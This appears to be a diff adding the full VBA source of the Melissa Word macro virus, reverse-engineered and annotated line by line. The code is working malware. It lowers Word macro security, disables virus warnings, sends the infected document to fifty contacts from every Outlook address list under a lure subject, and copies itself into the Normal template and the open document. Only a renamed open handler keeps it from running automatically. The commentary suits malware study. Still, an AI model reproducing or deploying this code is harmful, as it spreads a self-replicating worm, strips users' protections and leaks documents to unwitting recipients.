@@ -1,0 +1,205 @@
+' Melissa Virus
+' DO NOT RUN
+' Reverse Engineered and Commented by BHKL(YOU KNOW ME)
+
+Private Sub Document_Open1()
+
+' Originally ran from Document_Open(), but this was altered to protect the viewer
+
+' Hide error messages and keep going regardless
+On Error Resume Next
+
+' Check for the Registry Key
+
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
+
+' If it exists remove your protection
+' Switch off the menu option to alter macro security in Word 2000
+' Set the Word2000 security level to its lowest level
+
+CommandBars("Macro").Controls("Security...").Enabled = False
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
+Else
+
+' If it doesn't exist remove your protection
+' Switch off the macro menu options in Word 97
+' Turn off the warnings
+
+CommandBars("Tools").Controls("Macro").Enabled = False
+Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
+End If
+
+' Declare some variables
+' Instantiate a default email object, works even if Outlook is not actually running
+' Initialise MAPI for use
+
+Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
+Set UngaDasOutlook = CreateObject("Outlook.Application")
+Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
+
+
+If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo" Then
+
+' Check for the Registry Key
+' If it exists
+
+If UngaDasOutlook = "Outlook" Then
+
+' Check that Outlook is your default MAPI Client
+' Logon to the default MAPI profile using the default/saved password
+
+DasMapiName.Logon "profile", "password"
+
+' Hunt for all your address lists
+
+For y = 1 To DasMapiName.AddressLists.Count
+
+' Pick the first address list from the list
+
+Set AddyBook = DasMapiName.AddressLists(y)
+x = 1
+Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
+
+' Loop through the first fifty entries in the current address list
+' And add each entry to the recipients list
+' Note: each entry could be another address list in its own right
+
+For oo = 1 To AddyBook.AddressEntries.Count
+Peep = AddyBook.AddressEntries(x)
+BreakUmOffASlice.Recipients.Add Peep
+x = x + 1
+If x > 50 Then oo = AddyBook.AddressEntries.Count
+Next oo
+
+' Build outgoing email Subject and Body
+' Attach the current Word DOC
+' Note: The new attachment will be this DOC not necessarily LIST.DOC
+' Send the offending email
+
+BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
+BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else "
+BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
+BreakUmOffASlice.Send
+
+' Reset the recipients list
+
+Peep = ""
+
+' Do the whole thing again for the next address list until they are all done
+
+Next y
+
+' Logoff the MAPI Profile
+
+DasMapiName.Logoff
+
+End If
+
+' Set the Registry entry to avoid re-sending the mail from the current victim
+
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
+End If
+
+' Current Document infection code
+' This is redundant in the live virus, but could be altered to delete itself upon re-infection
+' The virus checks first the existance of the code and then its name
+' For the current document and the default template file
+' Variables and objects using prefixes AD and NT refer to Active Document and Normal Template
+
+Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
+Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
+
+NTCL = NTI1.CodeModule.CountOfLines
+ADCL = ADI1.CodeModule.CountOfLines
+BGN = 2
+
+' If the code module in the current document is not called "Melissa" then rename it to "Melissa"
+
+If ADI1.Name <> "Melissa" Then
+If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
+Set ToInfect = ADI1
+ADI1.Name = "Melissa"
+DoAD = True
+End If
+
+' If the code module in the default template file is not called "Melissa" then rename it to "Melissa"
+
+If NTI1.Name <> "Melissa" Then
+If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
+Set ToInfect = NTI1
+NTI1.Name = "Melissa"
+DoNT = True
+End If
+
+' If both the active document and the normal template are infected then goto the code beginning CYA:
+
+If DoNT <> True And DoAD <> True Then GoTo CYA
+
+' If the Normal Template is not infected
+' The code infects the Normal Template by copying the virus code into it line by line - odd
+
+If DoNT = True Then
+
+Do While ADI1.CodeModule.Lines(1, 1) = ""
+ADI1.CodeModule.DeleteLines 1
+Loop
+
+ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
+
+Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
+ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
+BGN = BGN + 1
+Loop
+
+End If
+
+' If the Active Document is not infected
+' The code infects the Active Document by copying the virus code into it line by line - odd
+
+If DoAD = True Then
+
+Do While NTI1.CodeModule.Lines(1, 1) = ""
+NTI1.CodeModule.DeleteLines 1
+Loop
+
+ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
+
+Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
+ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
+BGN = BGN + 1
+Loop
+
+End If
+
+' If the current document has a filename, other than containing the word "Document"
+' Note: This is because when a document is first created it default filename is "DocumentN" N being a number
+' Unless the template properties are altered, but this happens rarely
+' If filename OK (not "DocumentN")
+' Save the document under the current filename
+' If filename not OK (contains "DocumentN")
+' Set the saved flag to true
+
+CYA:
+If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
+ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
+ActiveDocument.Saved = True
+End If
+
+' The following comments are unaltered from the original
+
+'WORD/Melissa written by Kwyjibo
+'Works in both Word 2000 and Word 97
+'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
+'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
+
+' Payload
+' Small and non damaging message is displayed
+' If the number of todays date is the same as the number of the current minute then display the message in quotes below
+
+If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters. Game's over. I'm outta here."
+
+' The message is a quote from Bart Simpson from The Simpsons it refers to a scrabble game he won against Lisa
+' The attributed author's (Kwyjibo) name is the Word Bart used to get the high score mentioned above
+
+End Sub
